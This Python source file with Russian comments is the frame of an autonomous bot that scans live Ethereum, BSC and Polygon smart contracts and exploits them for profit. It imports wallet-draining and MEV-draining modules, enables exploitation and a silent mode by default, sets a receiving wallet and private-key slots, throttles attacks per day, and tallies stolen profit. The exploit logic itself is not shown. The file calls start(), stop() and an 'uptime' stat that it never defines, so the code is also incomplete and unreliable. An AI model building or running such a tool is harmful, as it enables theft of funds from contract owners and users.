#!/usr/bin/env python3
"""
Autonomous Contract Scanner - Автономный модуль для сканирования и эксплуатации уязвимостей в смарт-контрактах
"""

import os
import sys
import json
import time
import random
import logging
import threading
import argparse
from typing import Dict, List, Any, Optional, Tuple, Union, Set
from datetime import datetime

# Импортируем необходимые модули
from src.modules.web3_contract_analyzer import Web3ContractAnalyzer
from src.modules.web3_drainer import Web3Drainer, MEVDrainer

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='autonomous_contract_scanner.log'
)
logger = logging.getLogger('AutonomousContractScanner')

class AutonomousContractScanner:
    """
    Автономный сканер контрактов - теперь содержит конфигурацию и состояние, 
    но логика выполнения вынесена в Celery задачи.
    """
    
    def __init__(self, config_file: Optional[str] = None):
        """
        Инициализация автономного сканера контрактов
        
        Args:
            config_file: Путь к файлу конфигурации
        """
        self.logger = logger
        self.logger.info("Инициализация AutonomousContractScanner")
        
        # Загружаем конфигурацию
        self.config = self._load_config(config_file)
        
        # Внутренние переменные состояния (устарели)
        self.scanned_contracts_local_cache = set() # Might keep a local cache for stats or short-term memory
        self.vulnerable_contracts_local_cache = {} # Might keep a local cache
        
        # Счетчики и статистика (могут управляться отдельно или через Redis)
        self.stats = {
            "started_at": time.time(),
            "scanned_contracts": 0, # Will be updated differently now
            "vulnerable_contracts": 0,
            "exploited_contracts": 0,
            "total_profit": 0.0,
            "chains_scanned": {}
        }
        
        self.logger.info("AutonomousContractScanner инициализирован (конфигурация загружена)")
    
    def _load_config(self, config_file: Optional[str]) -> Dict[str, Any]:
        """
        Загружает конфигурацию из файла или использует конфигурацию по умолчанию
        
        Args:
            config_file: Путь к файлу конфигурации
            
        Returns:
            Dict: Загруженная конфигурация
        """
        default_config = {
            "log_level": "INFO",
            "exploit_enabled": True,
            "silent_mode": True,
            "chains": [
                {
                    "name": "ethereum",
                    "network": "mainnet",
                    "priority": 1,
                    "scan_interval": 60,  # Интервал сканирования в секундах
                    "min_exploitability": 0.7,  # Минимальный порог эксплуатируемости
                    "max_contracts_per_scan": 10
                },
                {
                    "name": "binance",
                    "network": "mainnet",
                    "priority": 2,
                    "scan_interval": 45,
                    "min_exploitability": 0.6,
                    "max_contracts_per_scan": 15
                },
                {
                    "name": "polygon",
                    "network": "mainnet",
                    "priority": 3,
                    "scan_interval": 30,
                    "min_exploitability": 0.6,
                    "max_contracts_per_scan": 20
                }
            ],
            "wallets": {
                "ethereum": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
                "binance": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
                "polygon": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
                "private_keys": []  # Приватные ключи для выполнения эксплойтов
            },
            "attack_throttling": {
                "max_concurrent_attacks": 3,
                "min_delay_between_attacks": 30,  # В секундах
                "max_attacks_per_day": 20
            },
            "api_keys": {
                "etherscan": "",
                "bscscan": "",
                "polygonscan": ""
            }
        }
        
        if not config_file or not os.path.exists(config_file):
            self.logger.warning(f"Конфигурационный файл не найден, используем конфигурацию по умолчанию")
            return default_config
        
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                # Объединяем с настройками по умолчанию
                for section in default_config:
                    if section not in config:
                        config[section] = default_config[section]
                    elif isinstance(default_config[section], dict):
                        for key in default_config[section]:
                            if key not in config[section]:
                                config[section][key] = default_config[section][key]
            
            # Устанавливаем API ключи из конфигурации
            if "api_keys" in config:
                for key, value in config["api_keys"].items():
                    if value:
                        os.environ[f"{key.upper()}_API_KEY"] = value
            
            return config
        except Exception as e:
            self.logger.error(f"Ошибка загрузки конфигурации: {e}")
            return default_config
    
    def get_config(self) -> Dict[str, Any]:
        """Возвращает текущую конфигурацию сканера."""
        return self.config

    def get_stats(self) -> Dict[str, Any]:
        """ 
        Возвращает текущую статистику. 
        Примечание: Статистика теперь должна агрегироваться из внешнего источника (Redis/DB).
        Эта функция может стать заглушкой или запрашивать данные из Redis.
        """
        # TODO: Implement fetching stats from Redis or DB instead of local state
        logger.warning("get_stats() currently returns local (potentially outdated) stats.")
        # Example fetch from Redis (needs implementation)
        # scanned_count = redis_client.scard(PROCESSED_CONTRACTS_SET) if redis_client else 0
        # self.stats['scanned_contracts'] = scanned_count 
        return self.stats

    def _format_time(self, seconds: float) -> str:
        """
        Форматирует время из секунд в человекочитаемый формат
        
        Args:
            seconds: Время в секундах
            
        Returns:
            str: Форматированное время
        """
        minutes, seconds = divmod(int(seconds), 60)
        hours, minutes = divmod(minutes, 60)
        days, hours = divmod(hours, 24)
        
        if days > 0:
            return f"{days}d {hours}h {minutes}m {seconds}s"
        elif hours > 0:
            return f"{hours}h {minutes}m {seconds}s"
        elif minutes > 0:
            return f"{minutes}m {seconds}s"
        else:
            return f"{seconds}s"


# Для запуска из командной строки
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Автономный сканер смарт-контрактов")
    parser.add_argument("--config", "-c", help="Путь к файлу конфигурации", default=None)
    parser.add_argument("--mode", "-m", choices=["scan", "exploit", "both"], default="both",
                       help="Режим работы: только сканирование, только эксплуатация или оба")
    args = parser.parse_args()
    
    scanner = AutonomousContractScanner(config_file=args.config)
    
    if args.mode in ["scan", "both"]:
        # Ограничиваем эксплуатацию, если выбран только режим сканирования
        if args.mode == "scan":
            scanner.config["exploit_enabled"] = False
    
    try:
        scanner.start()
        
        # Основной цикл, периодически выводит статистику
        while True:
            time.sleep(300)  # 5 минут
            stats = scanner.get_stats()
            print(f"\n=== Статистика работы ===")
            print(f"Время работы: {stats['uptime']}")
            print(f"Просканировано контрактов: {stats['scanned_contracts']}")
            print(f"Найдено уязвимых: {stats['vulnerable_contracts']}")
            print(f"Успешно эксплуатировано: {stats['exploited_contracts']}")
            print(f"Общая прибыль: ${stats['total_profit']:.2f}")
            print("========================\n")
            
    except KeyboardInterrupt:
        print("\nПрерывание работы...")
        scanner.stop()
        print("Сканер остановлен")
    except Exception as e:
        print(f"Критическая ошибка: {str(e)}")
        scanner.stop() 